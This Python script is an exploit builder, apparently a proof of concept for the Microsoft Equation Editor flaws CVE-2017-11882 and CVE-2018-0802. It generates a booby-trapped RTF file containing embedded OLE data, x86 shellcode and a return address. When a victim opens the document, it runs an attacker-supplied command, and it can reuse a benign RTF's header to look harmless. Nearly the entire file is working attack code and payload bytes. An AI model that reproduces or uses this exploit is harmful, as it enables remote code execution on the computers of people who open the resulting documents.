#!/usr/bin/env python
#-*- coding: utf-8 -*-
# @Author  : Evi1cg

"""
See the file 'LICENSE' for copying permission
"""
import argparse
import sys
from struct import pack

LOGO = R"""
      ___                         ___     
     /\  \                       /\__\    
    /::\  \         ___         /:/ _/_   
   /:/\:\__\       /\__\       /:/ /\__\  
  /:/ /:/  /      /:/  /      /:/ /:/  /  
 /:/_/:/__/___   /:/__/      /:/_/:/  /   
 \:\/:::::/  /  /::\  \      \:\/:/  /    
  \::/~~/~~~~  /:/\:\  \      \::/__/     
   \:\~~\      \/__\:\  \      \:\  \     
    \:\__\          \:\__\      \:\__\    
     \/__/           \/__/       \/__/ 
     
     For any Bug or Details : www.fb.com/official.palvindersingh
     
     """


RTF_HEADER = R"""{\rtf1\ansi\ansicpg1252\deff0\nouicompat\deflang1033{\fonttbl{\f0\fnil\fcharset0 Calibri;}}
{\*\generator Riched20 6.3.9600}\viewkind4\uc1
\pard\sa200\sl276\slmult1\f0\fs22\lang9"""


RTF_TRAILER = R"""\par}
"""


OBJCLASS11882 =R"""{\object\objemb\objupdate{\*\objclass Equation.3}\objw660\objh260{\*\objdata 01050000020000000b0000004571756174696f6e2e33000000000000000000000c0000d0cf11e0a1b11ae1000000000000000000000000000000003e000300feff0900060000000000000000000000010000000100000000000000001000000200000001000000feffffff0000000000000000fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffdffffff04000000fefffffffefffffffeffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff52006f006f007400200045006e00740072007900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000016000500ffffffffffffffff0200000002ce020000000000c0000000000000460000000000000000000000008020cea5613cd30103000000000200000000000001004f006c00650000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000201ffffffffffffffffffffffff000000000000000000000000000000000000000000000000000000000000000000000000000000001400000000000000010043006f006d0070004f0062006a00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000120002010100000003000000ffffffff00000000000000000000000000000000000000000000000000000000000000000000000001000000660000000000000003004f0062006a0049006e0066006f0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000012000201ffffffff04000000ffffffff000000000000000000000000000000000000000000000000000000000000000000000000030000000600000000000000feffffff02000000fefffffffeffffff050000000600000007000000feffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff010000020800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100feff030a0000ffffffff02ce020000000000c000000000000046170000004d6963726f736f6674204571756174696f6e20332e30000c0000004453204571756174696f6e000b0000004571756174696f6e2e3300f439b271000000000000000000000000000000000000000000000000000000000000000000000000000000000300040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"""


OBJECT_HEADER = R"""{\object\objemb\objupdate{\*\objclass Equation.3}\objw380\objh260{\*\objdata """



OBJECT_TRAILER = R"""
}{\result {\rtlch\fcs1 \af0 \ltrch\fcs0 \dn8\insrsid95542\charrsid95542 {\pict{\*\picprop\shplid1025{\sp{\sn shapeType}{\sv 75}}{\sp{\sn fFlipH}{\sv 0}}
{\sp{\sn fFlipV}{\sv 0}}{\sp{\sn fLockAspectRatio}{\sv 1}}{\sp{\sn pictureGray}{\sv 0}}{\sp{\sn pictureBiLevel}{\sv 0}}{\sp{\sn fRecolorFillAsPicture}{\sv 0}}{\sp{\sn fUseShapeAnchor}{\sv 0}}{\sp{\sn fFilled}{\sv 0}}{\sp{\sn fHitTestFill}{\sv 1}}
{\sp{\sn fillShape}{\sv 1}}{\sp{\sn fillUseRect}{\sv 0}}{\sp{\sn fNoFillHitTest}{\sv 0}}{\sp{\sn fLine}{\sv 0}}{\sp{\sn fPreferRelativeResize}{\sv 1}}{\sp{\sn fReallyHidden}{\sv 0}}
{\sp{\sn fScriptAnchor}{\sv 0}}{\sp{\sn fFakeMaster}{\sv 0}}{\sp{\sn fCameFromImgDummy}{\sv 0}}{\sp{\sn fLayoutInCell}{\sv 1}}}\picscalex100\picscaley100\piccropl0\piccropr0\piccropt0\piccropb0
\picw353\pich600\picwgoal200\pichgoal340\wmetafile8\bliptag1846300541\blipupi2307{\*\blipuid 6e0c4f7df03da08a8c6c623556e3c652}0100090000035100000000001200000000000500000009020000000005000000020101000000050000000102ffffff00050000002e0118000000050000000b02
00000000050000000c02200240011200000026060f001a00ffffffff000010000000c0ffffffaaffffff00010000ca0100000b00000026060f000c004d61746854797065000040000a00000026060f000a00ffffffff010000000000030000000000}}}}"""

OBJECT_TRAILER11882 =R"""
00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004500710075006100740069006F006E0020004E00610074006900760065000000000000000000000000000000000000000000000000000000000000000000000020000200FFFFFFFFFFFFFFFFFFFFFFFF00000000000000000000000000000000000000000000000000000000000000000000000004000000C5000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001050000050000000D0000004D45544146494C4550494354003421000035FEFFFF9201000008003421CB010000010009000003C500000002001C00000000000500000009020000000005000000020101000000050000000102FFFFFF00050000002E0118000000050000000B0200000000050000000C02A001201E1200000026060F001A00FFFFFFFF000010000000C0FFFFFFC6FFFFFFE01D0000660100000B00000026060F000C004D61746854797065000020001C000000FB0280FE0000000000009001000000000402001054696D6573204E657720526F6D616E00FEFFFFFF6B2C0A0700000A0000000000040000002D0100000C000000320A600190160A000000313131313131313131310C000000320A6001100F0A000000313131313131313131310C000000320A600190070A000000313131313131313131310C000000320A600110000A000000313131313131313131310A00000026060F000A00FFFFFFFF0100000000001C000000FB021000070000000000BC02000000000102022253797374656D000048008A0100000A000600000048008A01FFFFFFFF7CEF1800040000002D01010004000000F0010000030000000000
}{\result {\rtlch\fcs1 \af0 \ltrch\fcs0 \dn8\insrsid95542\charrsid95542 {\pict{\*\picprop\shplid1025{\sp{\sn shapeType}{\sv 75}}{\sp{\sn fFlipH}{\sv 0}}
{\sp{\sn fFlipV}{\sv 0}}{\sp{\sn fLockAspectRatio}{\sv 1}}{\sp{\sn pictureGray}{\sv 0}}{\sp{\sn pictureBiLevel}{\sv 0}}{\sp{\sn fRecolorFillAsPicture}{\sv 0}}{\sp{\sn fUseShapeAnchor}{\sv 0}}{\sp{\sn fFilled}{\sv 0}}{\sp{\sn fHitTestFill}{\sv 1}}
{\sp{\sn fillShape}{\sv 1}}{\sp{\sn fillUseRect}{\sv 0}}{\sp{\sn fNoFillHitTest}{\sv 0}}{\sp{\sn fLine}{\sv 0}}{\sp{\sn fPreferRelativeResize}{\sv 1}}{\sp{\sn fReallyHidden}{\sv 0}}
{\sp{\sn fScriptAnchor}{\sv 0}}{\sp{\sn fFakeMaster}{\sv 0}}{\sp{\sn fCameFromImgDummy}{\sv 0}}{\sp{\sn fLayoutInCell}{\sv 1}}}\picscalex100\picscaley100\piccropl0\piccropr0\piccropt0\piccropb0
\picw353\pich600\picwgoal200\pichgoal340\wmetafile8\bliptag1846300541\blipupi2307{\*\blipuid 6e0c4f7df03da08a8c6c623556e3c652}0100090000035100000000001200000000000500000009020000000005000000020101000000050000000102ffffff00050000002e0118000000050000000b02
00000000050000000c02200240011200000026060f001a00ffffffff000010000000c0ffffffaaffffff00010000ca0100000b00000026060f000c004d61746854797065000040000a00000026060f000a00ffffffff010000000000030000000000}}}}\par}
"""


OBJDATA_TEMPLATE = R"""
01050000020000000b0000004571756174696f6e2e33000000000000000000000c0000d0cf11e0a1
b11ae1000000000000000000000000000000003e000300feff090006000000000000000000000001
0000000100000000000000001000000200000001000000feffffff0000000000000000ffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
fffffffffffffffffffffffffffffffffffffffffffffffffffffffdffffff04000000fefffffffe
fffffffeffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffff52006f006f007400200045006e0074007200790000
00000000000000000000000000000000000000000000000000000000000000000000000000000000
00000016000500ffffffffffffffff0200000002ce020000000000c0000000000000460000000000
000000000000008020cea5613cd30103000000000200000000000001004f006c0065000000000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000
00000000000000000000000a000201ffffffffffffffffffffffff00000000000000000000000000
0000000000000000000000000000000000000000000000000000001400000000000000010043006f
006d0070004f0062006a000000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000120002010100000003000000ffffffff0000000000
00000000000000000000000000000000000000000000000000000000000000010000006600000000
00000003004f0062006a0049006e0066006f00000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000012000201ffffffff04000000ff
ffffff00000000000000000000000000000000000000000000000000000000000000000000000003
0000000600000000000000feffffff02000000fefffffffeffffff050000000600000007000000fe
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffff01000002080000000000000000000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000100feff030a0000ffffffff02
ce020000000000c000000000000046170000004d6963726f736f6674204571756174696f6e20332e
30000c0000004453204571756174696f6e000b0000004571756174696f6e2e3300f439b271000000
00000000000000000000000000000000000000000000000000000000000000000000000000030004
00000000000000000000000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000001c00000002009ec4a900000000000000c8a75c00c4
ee5b0000000000030101030a0a01085a5a33c099b202c1e2082be2e8ffffffffc35b50648b40308b
400899b203c1e21066ba120c03c28d5b1c53ffe02020202000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000000000004500710075
006100740069006f006e0020004e0061007400690076006500000000000000000000000000000000
0000000000000000000000000000000000000020000200ffffffffffffffffffffffff0000000000
0000000000000000000000000000000000000000000000000000000000000004000000c500000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000ffffffffffffffffff
ffffff00000000000000000000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000000000000000000000ff
ffffffffffffffffffffff0000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000
00000000000000ffffffffffffffffffffffff000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000001050000050000000d0000004d
45544146494c4550494354003421000035feffff9201000008003421cb010000010009000003c500
000002001c00000000000500000009020000000005000000020101000000050000000102ffffff00
050000002e0118000000050000000b0200000000050000000c02a001201e1200000026060f001a00
ffffffff000010000000c0ffffffc6ffffffe01d0000660100000b00000026060f000c004d617468
54797065000020001c000000fb0280fe0000000000009001000000000402001054696d6573204e65
7720526f6d616e00feffffff6b2c0a0700000a0000000000040000002d0100000c000000320a6001
90160a000000313131313131313131310c000000320a6001100f0a00000031313131313131313131
0c000000320a600190070a000000313131313131313131310c000000320a600110000a0000003131
31313131313131310a00000026060f000a00ffffffff0100000000001c000000fb02100007000000
0000bc02000000000102022253797374656d000048008a0100000a000600000048008a01ffffffff
7cef1800040000002d01010004000000f0010000030000000000
"""

stage1="\xB8\x44\xEB\x71\x12\xBA\x78\x56\x34\x12\x31\xD0\x8B\x08\x8B\x09\x8B\x09\x66\x83\xC1\x3C\x31\xDB\x53\x51\xBE\x64\x3E\x72\x12\x31\xD6\xFF\x16\x53\x66\x83\xEE\x4C\xFF\x10"
stage1=stage1.ljust(44,'\x90')


COMMAND_OFFSET = (0x949+0x2b)*2
COMD_LEN = (0x94-0x2b)

def create_ole_exec_primitive(command):
    hex_command = command.encode("hex")
    hex_command += (COMD_LEN - len(command)) * "20"
    hex_command += "2500"
    objdata_hex_stream = OBJDATA_TEMPLATE.translate(None, "\r\n")
    ole_data = objdata_hex_stream[:COMMAND_OFFSET] + hex_command + objdata_hex_stream[COMMAND_OFFSET + len(hex_command):]
    return OBJECT_HEADER + ole_data


def create_rtf(header, trailer, command):
    if len(command) > COMD_LEN:
        print '[!] Command must be shorter than 109 bytes!'
        sys.exit(0)
    ole = create_ole_exec_primitive(command + " #")
    payload='\x1c\x00\x00\x00\x02\x00\x9e\xc4\xa9\x00\x00\x00\x00\x00\x00\x00\xc8\xa7\\\x00\xc4\xee[\x00\x00\x00\x00\x00\x03\x01\x01\x03\n\n\x01\x08ZZ'
    payload+=stage1
    payload+=pack('<I',0x00402114) # ret
    payload+='\x00'*2
    payload+=command
    payload=payload.ljust(197,'\x00')
    return header + ole + OBJECT_TRAILER + OBJCLASS11882 + payload.encode('hex') + OBJECT_TRAILER11882  + trailer

def getrheader(file):
    input_file = open(file,"r").read()
    r_header = input_file.split("{\*\datastore")[0]
    return r_header

if __name__ == '__main__':
    print LOGO
    parser = argparse.ArgumentParser(description="PoC for CVE-2018-0802 And CVE-2017-11882")
    parser.add_argument("-c", "--command", help="Command run in target system", required=True)
    parser.add_argument('-o', "--output", help="Output exploit rtf", required=True)
    parser.add_argument("-i", "--input", help="Input normal rtf.", required=False)

    args = parser.parse_args()
    if args.input != None:
        r_header = getrheader(args.input)
    else:
        r_header = RTF_HEADER

    rtf_content = create_rtf(r_header, RTF_TRAILER,  args.command)

    output_file = open(args.output, "w")
    output_file.write(rtf_content)

    print "[*] Done ! output file --> " + args.output 
